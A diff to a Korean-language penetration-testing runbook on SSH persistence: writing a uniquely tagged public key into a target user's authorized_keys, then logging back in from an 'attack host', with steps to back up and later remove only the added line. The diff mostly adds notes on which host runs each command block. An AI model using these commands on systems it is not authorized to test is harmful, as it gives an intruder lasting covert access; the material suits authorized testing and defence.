@@ -14,11 +14,7 @@ tags:
 
 대상 사용자의 홈 디렉터리 또는 `authorized_keys`에 쓸 수 있고 해당 사용자의 SSH 로그인이 가능하다면, 변경 전 파일 내용과 메타데이터를 기록한 뒤 고유한 공개키 한 줄을 추가하여 그 사용자로 재접속하고 추가한 한 줄만 제거할 수 있는지 확인한다.
 
-## 사용할 때
-
-- 현재 셸은 불안정하지만 같은 사용자로 SSH 재접속할 경로가 필요할 때.
-- 대상 사용자의 홈 디렉터리나 `.ssh/authorized_keys`에 쓸 수 있을 때.
-- 기존 키를 덮어쓰지 않고 작업에서 추가한 키만 정확히 식별하고 제거할 수 있을 때.
+현재 셸이 불안정하고 대상 사용자의 홈 또는 `.ssh/authorized_keys`에 쓸 수 있으며, 기존 키를 덮어쓰지 않고 이번에 추가한 한 줄만 정확히 식별·제거할 수 있을 때 사용한다.
 
 ## 전제 조건
 
@@ -32,6 +28,8 @@ tags:
 ## 실행
 
 ### 대상 Linux 호스트에서 변경 전 상태 기록
+
+이 블록은 대상 Linux 호스트에서 실행한다. `<USER>`는 SSH 로그인할 실제 계정(가상 예: `alice`), `<HOME>`은 `getent passwd <USER>` 출력의 절대 홈 경로(가상 예: `/home/alice`), `<BACKUP_PATH>`는 작업 전 존재하지 않는 대상 호스트의 새 backup 경로다. 기존 `authorized_keys`의 hash·owner·group·mode는 복구 분기를 결정하므로 보존한다.
 
 ```bash
 getent passwd <USER>
@@ -48,6 +46,8 @@ cp -a <HOME>/.ssh/authorized_keys <BACKUP_PATH> 2>/dev/null || true
 
 ### 공격 호스트에서 고유 키 쌍 생성
 
+이 블록은 공격 호스트에서 실행한다. `<LOCAL_KEY>`는 작업 전 존재하지 않는 개인키의 절대 경로(가상 예: `/tmp/alice-ed25519`)이고 `<UNIQUE_ID>`는 공개키 comment에 넣는 이번 작업 식별자다.
+
 ```bash
 ssh-keygen -t ed25519 -f <LOCAL_KEY> -C "offsec-<UNIQUE_ID>" -N ''
 ```
@@ -57,6 +57,8 @@ ssh-keygen -t ed25519 -f <LOCAL_KEY> -C "offsec-<UNIQUE_ID>" -N ''
 - `<LOCAL_KEY>`와 `<LOCAL_KEY>.pub`가 생성되고 공개키 끝의 고유 comment로 이번 키를 구분할 수 있다.
 
 ### 대상 Linux 호스트에서 공개키 한 줄 추가
+
+이 블록은 대상 Linux 호스트에서 실행한다. `<GROUP>`은 대상 계정의 primary group이고 `<FULL_PUBLIC_KEY_LINE>`은 앞 단계 `<LOCAL_KEY>.pub`에서 얻은 한 줄 전체를 그대로 사용한다. 그 키 literal은 `authorized_keys` 형식이므로 축약하거나 임의 생성하지 않는다.
 
 ```bash
 install -d -m 700 -o <USER> -g <GROUP> <HOME>/.ssh
@@ -74,6 +76,8 @@ grep -nF "$PUBKEY" <HOME>/.ssh/authorized_keys
 - 파일과 디렉터리의 소유자·mode가 SSH가 읽을 수 있는 상태다.
 
 ### 공격 호스트에서 새 키 인증 검증
+
+이 블록은 공격 호스트에서 실행하며 `<LOCAL_KEY>`·`<USER>`는 앞 단계 값을 재사용하고 `<TARGET>`은 대상 SSH 서버의 IP 또는 FQDN(가상 예: `192.0.2.20`)이다.
 
 ```bash
 ssh -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o PasswordAuthentication=no -i <LOCAL_KEY> <USER>@<TARGET>
